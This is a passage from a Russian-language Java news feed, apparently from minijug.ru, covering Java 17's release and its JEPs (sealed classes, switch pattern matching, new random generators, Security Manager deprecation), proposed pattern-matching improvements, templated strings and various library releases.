&lt;p&gt;Тогда при паттерн-матчинге по переменной типа &lt;code&gt;Foo&amp;lt;Integer&amp;gt;&lt;/code&gt;, вариант &lt;code&gt;C&lt;/code&gt; рассматривать не нужно, потому что типы &lt;code&gt;Foo&amp;lt;String&amp;gt;&lt;/code&gt; и &lt;code&gt;Foo&amp;lt;Integer&amp;gt;&lt;/code&gt; несовместимы.&lt;/p&gt;

&lt;p class="pt-2"&gt;Улучшенный вывод типов при паттерн-матчинге. Сейчас необходимо указывать полный тип:&lt;/p&gt;
&lt;pre&gt;List&amp;lt;Integer&amp;gt; list = &lt;span style="color: blue"&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;();
&lt;span style="color: blue"&gt;switch&lt;/span&gt; (list) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; ArrayList&amp;lt;Integer&amp;gt; arrayList -&gt; ...
    ...
}&lt;/pre&gt;
&lt;p&gt;Предлагается разрешить не указывать параметры и дать компилятору выводить их из целевого типа:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;case&lt;/span&gt; ArrayList arrayList -&gt; ... &lt;span style="color: green"&gt;// Выводится ArrayList&amp;lt;Integer&amp;gt;&lt;/span&gt;&lt;/pre&gt;

&lt;p class="pt-2"&gt;Улучшенная проверка покрытия в более сложных случаях:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; A {}
&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; B1 &lt;span style="color: blue"&gt;extends&lt;/span&gt; A {}
&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; B2 &lt;span style="color: blue"&gt;extends&lt;/span&gt; A {}
&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; C &lt;span style="color: blue"&gt;extends&lt;/span&gt; A {}
&lt;span style="color: blue"&gt;final class&lt;/span&gt; D1 &lt;span style="color: blue"&gt;implements&lt;/span&gt; B1, C {}
&lt;span style="color: blue"&gt;final class&lt;/span&gt; D2 &lt;span style="color: blue"&gt;implements&lt;/span&gt; B2, C {}
...
&lt;span style="color: blue"&gt;int&lt;/span&gt; i = &lt;span style="color: blue"&gt;switch&lt;/span&gt; (arg) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; B1 b1 -&gt; 1;
    &lt;span style="color: blue"&gt;case&lt;/span&gt; B2 b2 -&gt; 2;
};
&lt;/pre&gt;
&lt;p&gt;В Java 17 такой код не компилируется, хотя &lt;code&gt;switch&lt;/code&gt; покрывает все возможные случаи. Предлагается это исправить.&lt;/p&gt;

&lt;p class="pt-2"&gt;Добавить частичный порядок между паттернами с условиями и константами. Такой код не должен компилироваться и &lt;code&gt;case&lt;/code&gt; с константой должен быть объявлен выше:&lt;/p&gt;
&lt;pre&gt;switch (value) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i &amp;&amp; bar() -&gt; {}
    &lt;span style="color: blue"&gt;case&lt;/span&gt; 3 -&gt; {}
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i -&gt; {}
}&lt;/pre&gt;

&lt;p class="pt-2"&gt;Запретить ставить ветку &lt;code&gt;default&lt;/code&gt; не в конец &lt;code&gt;switch&lt;/code&gt; (или хотя бы выдавать предупреждение):&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;switch&lt;/span&gt; (value) {
    &lt;span style="color: blue"&gt;default&lt;/span&gt; -&gt; {} &lt;span style="color: green"&gt;// Должна быть ошибка компиляции&lt;/span&gt;
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i &amp;&amp; i &gt; 0 -&gt; {}
}&lt;/pre&gt;

&lt;p class="pt-2"&gt;&amp;bull; &lt;a href="https://mail.openjdk.java.net/pipermail/announce/2021-October/000309.html"&gt;Начато голосование&lt;/a&gt; по созданию проекта RISC-V Port. Предложение сделать официальный порт OpenJDK под архитектуру RISC-V &lt;a href="https://mail.openjdk.java.net/pipermail/discuss/2020-December/005657.html"&gt;было озвучено&lt;/a&gt; Huawei ещё в декабре 2020 года. Тогда это предложение получило положительную обратную связь, и за это время порт стал достаточно стабилен, чтобы началась работа по его интеграции в главную ветку JDK. Когда проект будет одобрен, планируется выпустить JEP с предложением по интеграции.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://www.wildfly.org/news/2021/10/05/WildFly25-Final-Released/"&gt;WildFly 25&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://in.relation.to/2021/10/13/hibernate-orm-560-final/"&gt;Hibernate 5.6.0&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="https://github.com/google/guava/releases/tag/v31.0"&gt;Guava 31.0&lt;/a&gt; (и сразу же &lt;a href="https://github.com/google/guava/releases/tag/v31.0.1"&gt;31.0.1&lt;/a&gt; из-за проблемы с GWT).&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="https://github.com/mockito/mockito/releases/tag/v4.0.0"&gt;Mockito 4&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #28</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_28.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_28.html</id>
    <updated>2021-09-19T17:00:00Z</updated>
    <published>2021-09-19T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Главной новостью прошедшей недели стал &lt;a href="java_17.html"&gt;выход Java 17&lt;/a&gt;. Это следующая LTS-версия Java, которая вышла спустя 3 года после предыдущей &lt;a href="java_11_is_out.html"&gt;Java 11&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Но релиз Java 17 оказался не единственным большим событием. Сразу после того, как Oracle JDK 17 стал доступен для скачивания на сайте компании, Oracle опубликовал две важных новости.&lt;/p&gt;
&lt;p&gt;Во-первых, лицензия Oracle JDK &lt;a href="https://blogs.oracle.com/java/post/free-java-license"&gt;поменялась&lt;/a&gt; и вновь стала свободной, как это было &lt;a href="https://minijug.ru/no_more_free_oracle_jdk.html"&gt;до Java 11&lt;/a&gt;. Таким образом, сборку Oracle JDK 17 можно использовать бесплатно как в разработке, так и в продуктовом окружении в коммерческих целях. Такое решение было принято компанией в результате анализа обратной связи со стороны пользователей, которые приветствовали наличие сборок OpenJDK под GPL, но всё же хотели иметь &amp;laquo;проверенный и надёжный, как скала&amp;raquo;, образ Oracle JDK под однозначно бесплатной лицензией. Кроме того, было заявлено, что бесплатные &lt;a href="https://www.oracle.com/java/technologies/downloads/"&gt;обновления  Oracle JDK 17&lt;/a&gt; будут выходить как минимум до сентября 2024 года, то есть три года, а не полгода с момента выхода, как это было для Java 9-16. Что касается Oracle OpenJDK, то с ним всё остаётся &lt;a href="https://mail.openjdk.java.net/pipermail/discuss/2021-September/005949.html"&gt;без изменений&lt;/a&gt;: Oracle будет поддерживать OpenJDK первые полгода и выпустит, как обычно, только два обновления (17.0.1 и 17.0.2).&lt;/p&gt;
&lt;p&gt;Во-вторых, Oracle предложил &lt;a href="https://blogs.oracle.com/java/post/moving-the-jdk-to-a-two-year-lts-cadence"&gt;участить цикл&lt;/a&gt; выхода LTS-версий Java и выпускать LTS не каждые три года, а каждые два. Это значит, что согласно этому предложению следующей LTS-версией может стать Java 21, которая выйдет в 2023 году, а не Java 23. Такое изменение компания мотивирует тем, что несмотря на наличие предсказуемых шестимесячных релизов, многие предприятия всё же предпочитают использовать LTS и не спешат обновляться. Более короткий цикл мог бы дать компаниям мотивацию обновляться чаще и повысит привлекательность всех релизов, в том числе и не-LTS. Это в свою очередь даст ускорение всей экосистеме Java.&lt;/p&gt;
&lt;p&gt;Также Oracle запустил новый сайт &lt;a href="https://dev.java/"&gt;dev.java&lt;/a&gt;, в котором собраны полезные материалы для изучения Java, ссылки на новости и полезные ресурсы.&lt;/p&gt;
&lt;p class="pt-2"&gt;&amp;bull; Новости JEP'ов:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Java 18 пополнилась ещё одним JEP: &lt;a href="https://openjdk.java.net/jeps/417"&gt;Vector API (Third Incubator)&lt;/a&gt;. Теперь в Java 18 &lt;a href="http://openjdk.java.net/projects/jdk/18/"&gt;уже три JEP'а&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://openjdk.java.net/jeps/418"&gt;Internet-Address Resolution SPI&lt;/a&gt; перестал быть черновиком и стал кандидатом, получив номер 418. Про него мы писали в &lt;a href="java_news_24.html"&gt;выпуске #24&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Джим Ласки и Брайан Гётц &lt;a href="https://mail.openjdk.java.net/pipermail/amber-spec-experts/2021-September/003107.html"&gt;предложили&lt;/a&gt; рассмотреть идею новой языковой конструкции в Java: &lt;a href="https://github.com/openjdk/amber-docs/blob/master/site/design-notes/templated-strings.md"&gt;шаблонные строки&lt;/a&gt;. Шаблонные строки представляют собой улучшение и развитие идеи строковой интерполяции, которая есть в большинстве популярных языков программирования (C#, Kotlin, Scala, JavaScript и др).&lt;/p&gt;
&lt;p&gt;Главное отличие от простой строковой интерполяции &amp;ndash; это отделение механизма выражения шаблонной строки в языке от политики комбинирования строки и параметров. Например, все эти три примера используют один и тот же механизм:&lt;/p&gt;
&lt;pre&gt;String s = STR.&lt;span style="color: darkred"&gt;"Hello &lt;/span&gt;&lt;span style="color: darkblue"&gt;\{&lt;/span&gt;name&lt;span style="color: darkblue"&gt;}&lt;/span&gt;&lt;span style="color: darkred"&gt;, I am &lt;/span&gt;&lt;span style="color: darkblue"&gt;\{&lt;/span&gt;age&lt;span style="color: darkblue"&gt;}&lt;/span&gt;&lt;span style="color: darkred"&gt; years old"&lt;/span&gt;;&lt;/pre&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;var&lt;/span&gt; query = connection.&lt;span style="color: darkred"&gt;"SELECT * FROM &lt;/span&gt;&lt;span style="color: darkblue"&gt;\{&lt;/span&gt;table&lt;span style="color: darkblue"&gt;}&lt;/span&gt;&lt;span style="color: darkred"&gt;"&lt;/span&gt;;&lt;/pre&gt;
&lt;pre&gt;String message = resourceBundle.&lt;span style="color: darkred"&gt;"error: file &lt;/span&gt;&lt;span style="color: darkblue"&gt;\{&lt;/span&gt;filename&lt;span style="color: darkblue"&gt;}&lt;/span&gt;&lt;span style="color: darkred"&gt; not found"&lt;/span&gt;;&lt;/pre&gt;
&lt;p&gt;Но политика комбинирования шаблона и параметров совершенно разная, потому что каждый из объектов реализует интерфейс политики по-своему: &lt;code&gt;STR&lt;/code&gt; выполняет простую строковую конкатенацию, &lt;code&gt;connection&lt;/code&gt; создаёт объект запроса (который необязательно &lt;code&gt;String&lt;/code&gt;), выполняя валидацию и нормализацию, например, оборачивает имя таблицы в одинарные кавычки, а &lt;code&gt;resourceBundle&lt;/code&gt; пытается найти подходящую строку для текущей локали и форматирует сообщение по правилам &lt;code&gt;MessageFormat&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Таким образом, шаблонные строки не просто решают задачу интерполяции, а предоставляют гибкий и общий инструмент, дающий возможность библиотекам полностью контролировать весь процесс валидации, трансформации и комбинирования параметров со строкой.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://www.eclipse.org/eclipseide/2021-09/noteworthy/"&gt;Eclipse 2021-09&lt;/a&gt;. Среди улучшений более быстрый стартап IDE, функция Raw Paste, новый quick-fix для конвертации цикла &lt;code&gt;while&lt;/code&gt; в &lt;code&gt;do-while&lt;/code&gt;, дефолтные фильтры в Java &amp;#8594; Appearance &amp;#8594; Type Filters, улучшенный диалог сохранения нескольких файлов, улучшенная тёмная тема и другие. Встроенной поддержки Java 17 пока что нет, но она доступна в &lt;a href="https://marketplace.eclipse.org/content/java-17-support-eclipse-2021-09-421"&gt;Eclipse Marketplace&lt;/a&gt;. Более подробно про улучшения можно посмотреть в &lt;a href="https://www.youtube.com/watch?v=_OkIpz__Fyk"&gt;видео&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Роман Кеннке, лидер проекта Shenandoah в RedHat, рассказал, как им удалось достичь &lt;a href="https://developers.redhat.com/articles/2021/09/16/shenandoah-openjdk-17-sub-millisecond-gc-pauses"&gt;субмиллисекундных пауз&lt;/a&gt; сборщика мусора в Java 17. В этом им помогла &lt;a href="https://openjdk.java.net/jeps/376"&gt;конкурентная обработка стеков потоков&lt;/a&gt;, которая ранее была реализована для ZGC и также помогла значительно &lt;a href="https://malloc.se/blog/zgc-jdk16"&gt;снизить паузы&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://blog.jetbrains.com/idea/2021/09/java-annotated-monthly-september-2021/"&gt;Java Annotated Monthly&lt;/a&gt; от JetBrains за сентябрь 2021.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="https://gluonhq.com/products/javafx/openjfx-17-release-notes/"&gt;JavaFX 17&lt;/a&gt; с Long Term Support.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Вышла Java 17</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_17.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_17.html</id>
    <updated>2021-09-13T17:00:00Z</updated>
    <published>2021-09-13T17:00:00Z</published>
    <content type="html">&lt;p&gt;Вышла общедоступная версия &lt;a href="http://openjdk.java.net/projects/jdk/17/"&gt;Java 17&lt;/a&gt;. В этот релиз попало более &lt;a href="https://builds.shipilev.net/backports-monitor/release-notes-17.html"&gt;2700 закрытых задач и 14 JEP'ов&lt;/a&gt;. Изменения API можно посмотреть по &lt;a href="https://javaalmanac.io/jdk/17/apidiff/16/"&gt;этой ссылке&lt;/a&gt;.&lt;/p&gt;
&lt;!-- cut --&gt;
&lt;p&gt;Ссылки на скачивание:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://www.oracle.com/java/technologies/downloads/"&gt;Oracle JDK&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="http://jdk.java.net/17/"&gt;OpenJDK&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Перечислим JEP'ы, которые попали в Java 17.&lt;/p&gt;
&lt;h4&gt;Язык&lt;/h4&gt;
&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/306"&gt;Восстановление всегда строгой семантики чисел с плавающей точкой (JEP 306)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Теперь все выражения с плавающей точкой вычисляются строго на всех платформах, и разницы между строгой семантикой и семантикой по умолчанию больше нет (как это было до Java 1.2). Таким образом, ключевое слово &lt;code&gt;strictfp&lt;/code&gt; больше не имеет эффекта, и при его использовании выдаётся предупреждение:&lt;/p&gt;
&lt;pre&gt;&amp;gt; javac Main.java
Main.java:1: &lt;span style="color: orange"&gt;warning: [strictfp] as of release 17, all floating-point
expressions are evaluated strictly and 'strictfp' is not required&lt;/span&gt;
strictfp public class Main {
                ^&lt;/pre&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/409"&gt;&lt;code&gt;sealed&lt;/code&gt; классы (JEP 409)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;&amp;laquo;Запечатанные&amp;raquo; классы после двух preview итераций в &lt;a href="https://openjdk.java.net/jeps/360"&gt;Java 15&lt;/a&gt; и &lt;a href="https://openjdk.java.net/jeps/397"&gt;Java 16&lt;/a&gt; наконец-то стали стабильной синтаксической конструкцией и больше не требуют флага &lt;code&gt;--enable-preview&lt;/code&gt;. Различий по сравнению с Java 16 нет.&lt;/p&gt;
&lt;p&gt;Напомним, ключевым слово &lt;code&gt;sealed&lt;/code&gt; можно пометить класс или интерфейс, если нужно ограничить список его наследников. Список можно указать явно, перечислив все наследники с помощью ключевого слова &lt;code&gt;permits&lt;/code&gt;, либо он выведется неявно компилятором из всех задекларированных наследников в текущем исходном файле.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/406"&gt;Паттерн-матчинг для &lt;code&gt;switch&lt;/code&gt; (Preview) (JEP 406)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Появилась новая синтаксическая конструкция в режиме preview, существенно расширяющая возможности оператора &lt;code&gt;switch&lt;/code&gt;: теперь оператор &lt;code&gt;switch&lt;/code&gt; поддерживает не только простые тесты на равенство с константами примитивов, перечислений и строк, но и тесты по паттернам.&lt;/p&gt;
&lt;p&gt;Простейшие паттерны это паттерны по типу:&lt;/p&gt;
&lt;pre&gt;Object o = ...
&lt;span style="color: blue"&gt;return switch&lt;/span&gt; (o) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i -&gt; String.format(&lt;span style="color: darkred"&gt;"int %d"&lt;/span&gt;, i);
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Long l -&gt; String.format(&lt;span style="color: darkred"&gt;"long %d"&lt;/span&gt;, l);
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Double d -&gt; String.format(&lt;span style="color: darkred"&gt;"double %f"&lt;/span&gt;, d);
    &lt;span style="color: blue"&gt;case&lt;/span&gt; String s -&gt; String.format(&lt;span style="color: darkred"&gt;"String %s"&lt;/span&gt;, s);
    &lt;span style="color: blue"&gt;default&lt;/span&gt; -&gt; o.toString();
};&lt;/pre&gt;
&lt;p&gt;Паттерны могут снабжаться условиями путём добавления охранных паттернов:&lt;/p&gt;
&lt;pre&gt;Shape s = ...
&lt;span style="color: blue"&gt;switch&lt;/span&gt; (s) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Triangle t &amp;&amp; (t.calculateArea() &gt; 100) -&gt;
        System.out.println(&lt;span style="color: darkred"&gt;"Large Triangle"&lt;/span&gt;);
    &lt;span style="color: blue"&gt;default&lt;/span&gt; -&gt;
        System.out.println(&lt;span style="color: darkred"&gt;"A shape (possibly a small triangle)"&lt;/span&gt;);
}&lt;/pre&gt;
&lt;p&gt;Также добавлена поддержка матчинга &lt;code&gt;null&lt;/code&gt; с помощью отдельной метки &lt;code&gt;null&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;Object o = ...
&lt;span style="color: blue"&gt;switch&lt;/span&gt; (o) {
    &lt;span style="color: blue"&gt;case null&lt;/span&gt; -&gt; System.out.println(&lt;span style="color: darkred"&gt;"Null"&lt;/span&gt;);
    &lt;span style="color: blue"&gt;case&lt;/span&gt; String s -&gt; System.out.println(&lt;span style="color: darkred"&gt;"String: "&lt;/span&gt; + s);
    &lt;span style="color: blue"&gt;default&lt;/span&gt; -&gt; System.out.println(&lt;span style="color: darkred"&gt;"Other"&lt;/span&gt;);
}&lt;/pre&gt;
&lt;p&gt;Ветки &lt;code&gt;null&lt;/code&gt; и &lt;code&gt;default&lt;/code&gt; можно объединять друг с другом:&lt;/p&gt;
&lt;pre&gt;String s = ...
&lt;span style="color: blue"&gt;switch&lt;/span&gt; (s) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; &lt;span style="color: darkred"&gt;"Foo"&lt;/span&gt;, &lt;span style="color: darkred"&gt;"Bar"&lt;/span&gt; -&gt; System.out.println(&lt;span style="color: darkred"&gt;"Foo or Bar"&lt;/span&gt;);
    &lt;span style="color: blue"&gt;case null, default&lt;/span&gt; -&gt; System.out.println(&lt;span style="color: darkred"&gt;"Null or other"&lt;/span&gt;);
}&lt;/pre&gt;
&lt;p&gt;Все &lt;code&gt;switch&lt;/code&gt; с паттернами должны быть исчерпывающими (даже если это &lt;code&gt;switch&lt;/code&gt; statement, а не &lt;code&gt;switch&lt;/code&gt; expression):&lt;/p&gt;
&lt;pre&gt;Object o = ...
&lt;span style="color: blue"&gt;switch&lt;/span&gt; (o) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; String s -&gt; System.out.println(&lt;span style="color: darkred"&gt;"String: "&lt;/span&gt; + s);
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i -&gt; System.out.println(&lt;span style="color: darkred"&gt;"Integer"&lt;/span&gt;);
}&lt;/pre&gt;
&lt;pre&gt;&amp;gt; javac --enable-preview --release 17 Main.java
Main.java:4: &lt;span style="color: red"&gt;error: the switch statement does not cover all possible input values
        switch (o) {
        ^&lt;/span&gt;&lt;/pre&gt;
&lt;p&gt;Чтобы пример выше стал компилироваться, нужно либо добавить ветку &lt;code&gt;default&lt;/code&gt;, либо тотальный паттерн (в данном случае &lt;code&gt;case Object obj&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Старый &lt;code&gt;switch&lt;/code&gt; statement можно продолжать делать неисчерпывающим, однако это может &lt;a href="https://mail.openjdk.java.net/pipermail/amber-spec-experts/2021-April/002959.html"&gt;измениться в будущем&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Новый &lt;code&gt;switch&lt;/code&gt; очень хорошо взаимодействует с &lt;code&gt;sealed&lt;/code&gt; классами, поскольку круг подтипов является ограниченным, а это значит, что ветка &lt;code&gt;default&lt;/code&gt; не является необходимой, если перечислены все возможные случаи:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; S &lt;span style="color: blue"&gt;permits&lt;/span&gt; A, B, C {}
&lt;span style="color: blue"&gt;final class&lt;/span&gt; A &lt;span style="color: blue"&gt;implements&lt;/span&gt; S {}
&lt;span style="color: blue"&gt;final class&lt;/span&gt; B &lt;span style="color: blue"&gt;implements&lt;/span&gt; S {}
&lt;span style="color: blue"&gt;record&lt;/span&gt; C(&lt;span style="color: blue"&gt;int&lt;/span&gt; i) &lt;span style="color: blue"&gt;implements&lt;/span&gt; S {}&lt;/pre&gt;
&lt;pre&gt;S s = ...
&lt;span style="color: blue"&gt;switch&lt;/span&gt; (s) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; A a -&gt; System.out.println(&lt;span style="color: darkred"&gt;"A"&lt;/span&gt;);
    &lt;span style="color: blue"&gt;case&lt;/span&gt; B b -&gt; System.out.println(&lt;span style="color: darkred"&gt;"B"&lt;/span&gt;);
    &lt;span style="color: blue"&gt;case&lt;/span&gt; C c -&gt; System.out.println(&lt;span style="color: darkred"&gt;"C"&lt;/span&gt;);
}&lt;/pre&gt;
&lt;p class="pt-2"&gt;На этом беглое рассмотрение паттерн-матчинга для &lt;code&gt;switch&lt;/code&gt; мы закончим, а про другие возможности и нюансы можно почитать на &lt;a href="https://openjdk.java.net/jeps/406"&gt;странице JEP&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;API&lt;/h4&gt;
&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/356"&gt;Enhanced Pseudo-Random Number Generators (JEP 356)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;В Java 17 появился новый пакет &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/random/package-summary.html"&gt;&lt;code&gt;java.util.random&lt;/code&gt;&lt;/a&gt; с новыми интерфейсами и реализациями генераторов псевдослучайных чисел. Наверху иерархии новый интерфейс &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/random/RandomGenerator.html"&gt;&lt;code&gt;RandomGenerator&lt;/code&gt;&lt;/a&gt;, который является родителем как новых генераторов и специализаций (&lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/random/RandomGenerator.SplittableGenerator.html"&gt;&lt;code&gt;SplittableRandomGenerator&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/random/RandomGenerator.JumpableGenerator.html"&gt;&lt;code&gt;JumpableRandomGenerator&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/random/RandomGenerator.LeapableGenerator.html"&gt;&lt;code&gt;LeapableRandomGenerator&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/random/RandomGenerator.ArbitrarilyJumpableGenerator.html"&gt;&lt;code&gt;ArbitrarilyJumpableRandomGenerator&lt;/code&gt;&lt;/a&gt;), так и старых классов (&lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/Random.html"&gt;&lt;code&gt;Random&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/concurrent/ThreadLocalRandom.html"&gt;&lt;code&gt;ThreadLocalRandom&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/SplittableRandom.html"&gt;&lt;code&gt;SplittableRandom&lt;/code&gt;&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Таким образом, алгоритмы генерации чисел теперь стали более взаимозаменяемыми:&lt;/p&gt;
&lt;pre&gt;RandomGenerator random1 = &lt;span style="color: blue"&gt;new&lt;/span&gt; Random();
RandomGenerator random2 = ThreadLocalRandom.current();
RandomGenerator random3 = RandomGenerator.getDefault();
RandomGenerator random4 = RandomGenerator.of(&lt;span style="color: darkred"&gt;"Xoshiro256PlusPlus"&lt;/span&gt;);&lt;/pre&gt;
&lt;p&gt;Кроме того, список генераторов ограничен не только теми, что предоставлены самим JDK, но является расширяемыем: предоставлять свои или сторонние реализации можно через механизм &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/ServiceLoader.html"&gt;ServiceLoader&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/398"&gt;Deprecate the Applet API for Removal (JEP 398)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;API аплетов, которое &lt;a href="https://openjdk.java.net/jeps/289"&gt;стало deprecated&lt;/a&gt; в Java 9, теперь стало помечено как подлежащее окончательному удалению. Таким образом, существующий код, который использует классы из Applet API (&lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.desktop/java/applet/Applet.html"&gt;&lt;code&gt;java.applet.Applet&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.desktop/javax/swing/JApplet.html"&gt;&lt;code&gt;javax.swing.JApplet&lt;/code&gt;&lt;/a&gt; и т.д.), может перестать работать на одной из следующих версий Java (но всё ещё продолжит работать на Java 17).&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/407"&gt;Удаление RMI Activation (JEP 407)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Механизм RMI Activation, который стал &lt;a href="https://openjdk.java.net/jeps/385"&gt;deprecated в Java 15&lt;/a&gt;, теперь удалён окончательно. RMI Activation был частью RMI, которая использовалась в чрезвычайно малом количестве приложений и фактически устарела. Для того чтобы избежать дорогой поддержки никому не нужного механизма, было принято решение его полностью удалить.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/411"&gt;Deprecate the Security Manager for Removal (JEP 411)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Security Manager стал помечен как подлежащий удалению. В одной из будущих версий его планируется удалить окончательно. Аннотацию &lt;code&gt;@Deprecated(forRemoval=true)&lt;/code&gt; получили 10 классов и 10 методов из стандартной библиотеки Java. Среди них &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/SecurityManager.html"&gt;&lt;code&gt;java.lang.SecurityManager&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/security/Policy.html"&gt;&lt;code&gt;java.security.Policy&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/System.html#setSecurityManager(java.lang.SecurityManager)"&gt;&lt;code&gt;java.lang.System::setSecurityManager&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/System.html#getSecurityManager()"&gt;&lt;code&gt;java.lang.System::getSecurityManager&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/Thread.html#checkAccess()"&gt;&lt;code&gt;java.lang.Thread::checkAccess&lt;/code&gt;&lt;/a&gt; и другие. Кроме того, при вызове метода &lt;code&gt;System.setSecurityManager()&lt;/code&gt; во время исполнения будет выдаваться предупреждение:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: orange"&gt;WARNING: A terminally deprecated method in java.lang.System has been called
WARNING: System::setSecurityManager has been called by com.foo.bar.Server
  (file:/tmp/foobarserver/thing.jar)
WARNING: Please consider reporting this to the maintainers of com.foo.bar.Server
WARNING: System::setSecurityManager will be removed in a future release&lt;/span&gt;&lt;/pre&gt;
&lt;p&gt;Также предупреждение будет выдаваться при установке Security Manager через аргументы командной строки указанием свойства &lt;code&gt;java.security.manager&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&amp;gt; java -Djava.security.manager=com.foo.bar.Server MyApp
&lt;span style="color: darkorange"&gt;WARNING: A command line option has enabled the Security Manager
WARNING: The Security Manager is deprecated and will be removed in a future release&lt;/span&gt;&lt;/pre&gt;

&lt;p class="pt-2"&gt;Начать отказ от Security Manager было решено по причине того, что он слабо отвечает современным требованиям безопасности и всё меньше и меньше пользуется спросом при разработке новых Java-приложений, но цена его поддержки остаётся очень высокой. У него хрупкая модель разрешений, сложная программная модель, и он приносит большие накладные расходы по производительности.&lt;/p&gt;

